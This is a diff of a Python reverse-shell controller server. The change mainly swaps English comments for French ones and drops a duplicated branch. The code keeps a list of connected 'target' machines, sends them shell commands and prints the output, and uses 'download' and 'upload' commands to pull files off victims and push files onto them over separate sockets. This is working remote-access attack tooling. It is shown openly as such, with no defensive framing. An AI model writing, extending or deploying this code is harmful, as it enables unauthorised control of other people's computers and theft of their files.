@@ -204,33 +204,33 @@ class Server:
                 del self.clients[self.current_client]
                 del self.clients_cwd[self.current_client]
                 break
-            elif (match := re.search(r"download\s*(.*)", command)):
-                # receive the file
+            elif (match := re.search(r"download\s*(.*)", command)):  # <download> 'telecharger' Peermet de recuperer des fichiers depuis la machine de la cible 
+                # Reception du fichier 
                 self.receive_file()
-            elif (match := re.search(r"download\s*(.*)", command)):
-                # receive the file
-                self.receive_file()
-            elif (match := re.search(r"upload\s*(.*)", command)):
-                # send the specified file if it exists
-                filename = match.group(1)
-                if not os.path.isfile(filename):
-                    print(f"The file {filename} does not exist in the local machine.")
+
+            elif (match := re.search(r"upload\s*(.*)", command)):  # <upload> 'envoyer' Permet d'envoyer des fichiers sur la machine de la cible
+                # Envoie de fichier(si existe) du serveur au client
+                filename = match.group(1) # Recupere le chemin du fichier 
+                if not os.path.isfile(filename): # Verifie si le fichier existe 
+                    print(f"Le fichier [{filename}] est introuvable sur le serveur local ") # >>>>>> A ecrire dans les LOGS 
                 else:
                     self.send_file(filename)
-            # retrieve command results
+            # Une fois la commande envoyer on recupere la reponse du client (Paradoxal car normalement c'est le serveur qui envoie une reponse Mais Revere Shell)
             output = self.receive_all_data(client_socket,BUFFER_SIZE).decode()
-            # split command output and current directory
+            # Separation de la reponse avec le reperoire courant 
             results, cwd = output.split(SEPARATOR)
-            # update the cwd
+            # Mettre a jour le CWD
             self.clients_cwd[self.current_client] = cwd
-            # print output
+            # Affiche la reponse du client ou la sortie 
             print(results)
+        
+        # Une fois la boucle quitter(Interpreteur client fermer) on vide le pointeur sur le client courant  
         self.current_client = None
     
     def receive_all_data(self, socket, buffer_size):
         """
-            Function responsible for calling socket.recv()
-            repeatedly until no data is to be received
+            Cette fonction appel socket.recv() pour recvoir toute les data
+            envoyer jusqu'a ce qui'il n'y en ai plus
         """
         data = b""
         while True:
@@ -241,71 +241,66 @@ class Server:
         return data
     
     def receive_file(self, port=2023):
-        # make another server socket with a custom port
+        # Creation d'un autres serveur avec le port client 
         s = self.get_server_socket(custom_port=port)
-        # accept client connections
         client_socket, client_address = s.accept()
-        print(f"{client_address} connected.")
-        # receive the file
+        print(f"Client [{client_address}] | >> [info] : Client connecter et pret pour reception.") # a ecrire dans les logs 
+        # reception
         Server._receive_file(client_socket)
     
     def send_file(self, filename, port=2023):
-        # make another server socket with a custom port
+        # Creation d'un autre serveur d'envoie avec le port client 
         s = self.get_server_socket(custom_port=port)
-        # accept client connections
         client_socket, client_address = s.accept()
-        print(f"{client_address} connected.")
-        # receive the file
+        print(f"Client [{client_address}] | >> [info] : Client connecter et pret pour envoie.") # a ecrire dans les logs
         Server._send_file(client_socket, filename)
-    
+
+    """
+        Ces deux methodes sont implementer en tant que methode de classe pour 
+        pouvoir les reutiliser plus tard dans d'autre programme sans avoir a creer 
+        d'instance (Gain d'effoicacite et de peroformance du code )
+    """
     @classmethod
     def _receive_file(cls, s: socket.socket, buffer_size=4096):
-        # receive the file infos using socket
         received = s.recv(buffer_size).decode()
         filename, filesize = received.split(SEPARATOR)
-        # remove absolute path if there is
+        # recupere juste le nom du fichier si le chemin est forunis 
         filename = os.path.basename(filename)
-        # convert to integer
+        # Convertit en entier 
         filesize = int(filesize)
-        # start receiving the file from the socket
-        # and writing to the file stream
-        progress = tqdm.tqdm(range(filesize), f"Receiving {filename}", unit="B", unit_scale=True, unit_divisor=1024)
+        # Commence la reception du fichier 
+        # Affiche la barre de progression ! Juste pour le kiff :) !!!!!!!!!!!!
+        progress = tqdm.tqdm(range(filesize), f" [info] : Reception >>[{filename}]<< ", unit="B", unit_scale=True, unit_divisor=1024)
+ 
         with open(filename, "wb") as f:
             while True:
-                # read 1024 bytes from the socket (receive)
                 bytes_read = s.recv(buffer_size)
                 if not bytes_read:
-                    # nothing is received
-                    # file transmitting is done
-                    break
-                # write to the file the bytes we just received
+                    # Si aucune data a reçu ! La reception est terminer 
+                    break            
+                # Ecrire en binaire toutes les data recu 
                 f.write(bytes_read)
-                # update the progress bar
+                # Mettre a jour la barre de progression 
                 progress.update(len(bytes_read))
-        # close the socket
+        # Une fois l'operation finis fermer le socket ! TOUJOURS FERMER LES SOCKETS OUVERTS !!!!!!!! TOUJOURS 
         s.close()
 
     @classmethod
     def _send_file(cls, s: socket.socket, filename, buffer_size=4096):
-        # get the file size
+        # Recupere la taille du fichier envoyer 
         filesize = os.path.getsize(filename)
-        # send the filename and filesize
+        # Envoie du filename et du sizefile 
         s.send(f"{filename}{SEPARATOR}{filesize}".encode())
-        # start sending the file
-        progress = tqdm.tqdm(range(filesize), f"Sending {filename}", unit="B", unit_scale=True, unit_divisor=1024)
+        # Commencer l'envoie 
+        # Activer la barre de progression! Encore pour le kiFF :) :) :) :) ! AHHHHHHHHHHHHHH 
+        progress = tqdm.tqdm(range(filesize), f" [info] : Reception >>[{filename}]<< ", unit="B", unit_scale=True, unit_divisor=1024)
         with open(filename, "rb") as f:
             while True:
-                # read the bytes from the file
                 bytes_read = f.read(buffer_size)
                 if not bytes_read:
-                    # file transmitting is done
                     break
-                # we use sendall to assure transimission in
-                # busy networks
                 s.sendall(bytes_read)
-                # update the progress bar
                 progress.update(len(bytes_read))
-        # close the socket
         s.close()
 
 if __name__ == "__main__":
